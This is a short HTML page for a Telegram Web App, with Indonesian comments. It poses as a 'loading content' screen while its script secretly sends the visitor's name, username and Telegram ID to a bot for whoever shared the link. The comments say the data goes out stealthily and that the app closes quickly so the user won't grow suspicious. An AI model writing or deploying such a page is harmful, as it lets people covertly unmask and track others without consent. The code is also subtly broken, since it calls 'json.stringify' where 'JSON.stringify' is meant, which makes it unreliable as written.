<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
    </style>
</head>
<body>
    <p>Memuat konten...</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const user = tg.initDataUnsafe.user;
        const creatorId = tg.initDataUnsafe.start_param;

        if (user && creatorId) {
            // Mengirim data ke bot secara stealth
            tg.sendData(json.stringify({
                "penerima_notif": creatorId,
                "nama_pengklik": user.first_name,
                "user_pengklik": user.username || "n/a",
                "id_pengklik": user.id
            }));
            
            // Supaya tidak curiga, setelah kirim data, tutup app
            setTimeout(() => { tg.close(); }, 500);
        }
    </script>
</body>
</html>
